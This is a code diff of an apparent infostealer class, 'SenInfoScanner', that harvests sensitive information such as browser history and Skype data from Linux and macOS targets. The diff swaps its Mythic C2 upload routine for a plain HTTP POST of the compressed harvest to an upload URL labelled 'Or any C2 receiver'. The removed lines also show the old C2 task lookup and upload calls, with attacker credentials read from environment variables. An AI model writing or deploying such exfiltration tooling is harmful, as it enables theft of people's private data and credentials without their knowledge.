@@ -4,25 +4,15 @@
  # @ Description: class to collect sensitive information from linux/mac targets
  '''
 import platform
-import socket
-import psutil
 import os
-import uuid
-import getpass
-import re
-import shutil
-import sqlite3
 import browserhistory as bh
 import base64
-import zipfile
-import gzip
 from skpy import Skype
-from mythic_container.MythicRPC import MythicRPC
 import zlib
 from pathlib import Path
 import tempfile
-import asyncio
 from dotenv import load_dotenv
+import requests
 
 # load .env for sensitive tokens
 load_dotenv()
@@ -45,27 +35,6 @@ class SenInfoScanner:
             else:
                 # Default to root path for Linux/macOS
                 self.root_path = '/'
-
-    async def get_latest_task_id(self,):
-        rpc = MythicRPC()
-        # fetch the latest callback
-        response = await rpc.execute("get_callback_info", callback_id=7)
-        print(response)
-        callbacks = response.get("callbacks",[])
-
-        if not callbacks:
-            raise RuntimeError("[-] No callbacks found.")
-        
-        # Extract the callback ID
-        callback_id = callbacks[0]["id"]
-
-        # fetch the tasks associated with this callback
-        response = await rpc.execute("get_all_tasks", callback_id=callback_id, limit=1)
-        tasks = response.get("tasks", [])
-        if tasks:
-            return tasks[0].get("id")
-        else:
-            raise RuntimeError("[-] No tasks found for this callback.")
 
     def _ext_scan(self, target_ext: list):
         ''' cover potential sensitive info via file extension
@@ -250,34 +219,17 @@ class SenInfoScanner:
         with Path(self.save_location).joinpath(file).open("wb") as fw:
             fw.write(encoded_compressed_info)
 
+    def _send_file(self, file, upload_url):
+        try:
+            with Path(self.save_location).joinpath(file).open('rb') as f:
+                print(f"[+] Sending data to {upload_url}")
+                r = requests.post(upload_url, files={'file': f})
+                print("[+] Response:", r.status_code, r.text)
+        except Exception as e:
+            print("[-] Failed to send:", e)
 
-    async def upload_file(self, task_id: int, local_file_path:str, filename: str, remote_path:str):
-        
-        response = await MythicRPC().execute(
-                "upload_file",
-                file = local_file_path,
-                filename = filename,
-                delete_after_fetch=False
-                )
-        
-        mythic_file_id = response.get("agent_file_id")
 
-        if mythic_file_id:
-            await MythicRPC.execute(
-                "create_subtask",
-                task_id = task_id,
-                command="upload",
-                params = {"file": mythic_file_id, "remote_path": remote_path}
-                )
-        else:
-            print("[-] File upload to Mythic Failed")
-
-async def run():
-
-    os.environ['MYTHIC_USERNAME'] = os.getenv("ADMINUSER")
-    os.environ["MYTHIC_PASSWORD"] = os.getenv("PASSWORD")
-    os.environ["MYTHIV_HOST"] = os.getenv("ATTACK_IP")
-    os.environ["MYTHIC_VHOST"] = os.getenv("MYTHIC_VHOST")
+if __name__ == "__main__":
 
     temp_path = tempfile.gettempdir()
     senscanner = SenInfoScanner(temp_path)
@@ -287,13 +239,8 @@ async def run():
     # get the information and saved to a temp folder
     senscanner._sen_info(file_name)
 
-    # get the task_id
-    task_id = await senscanner.get_latest_task_id()
     # upload file to c2 server
-    local_path = "~/Downloads"
     remote_file = Path(temp_path).joinpath(file_name)
-    await senscanner.upload_file(task_id, local_path, file_name, remote_file.as_posix())
 
-
-if __name__ == "__main__":
-    asyncio.run(run())
+    remote_upload_url = f"http://127.0.0.1:8000/upload"  # Or any C2 receiver
+    senscanner._send_file(file_name, remote_upload_url)
